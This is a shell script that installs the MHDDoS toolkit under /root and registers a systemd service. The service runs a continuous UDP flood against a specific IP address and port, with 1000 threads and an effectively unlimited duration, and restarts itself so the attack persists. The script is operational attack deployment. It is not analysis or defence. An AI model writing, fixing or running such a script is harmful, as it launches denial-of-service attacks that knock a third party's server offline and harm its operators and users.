# 1. Ensure venv tool is installed (Critical Step)
sudo apt update && sudo apt install python3-venv python3-pip git -y

# 2. Go to the directory and wipe any broken venv
cd /root/MHDDoS
rm -rf venv

# 3. Create a fresh virtual environment
python3 -m venv venv

# 4. Install the requirements specifically into that venv
./venv/bin/pip install --upgrade pip
./venv/bin/pip install -r requirements.txt
./venv/bin/pip install PyRoxy

# 5. Update the service file to point to the correct path
cat <<EOF | sudo tee /etc/systemd/system/mhddos.service
[Unit]
Description=MHDDoS Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
WorkingDirectory=/root/MHDDoS
ExecStart=/root/MHDDoS/venv/bin/python3 start.py UDP 162.19.126.179:7777 1000 99999999999
Restart=always
RestartSec=3s
RuntimeMaxSec=10min

[Install]
WantedBy=multi-user.target
EOF

# 6. Reload and Kickstart
sudo systemctl daemon-reload
sudo systemctl enable mhddos.service
sudo systemctl restart mhddos.service

echo "------------------------------------------------"
echo "Verification: Checking if venv exists now..."
ls -l /root/MHDDoS/venv/bin/python3
echo "------------------------------------------------"
systemctl status mhddos.service
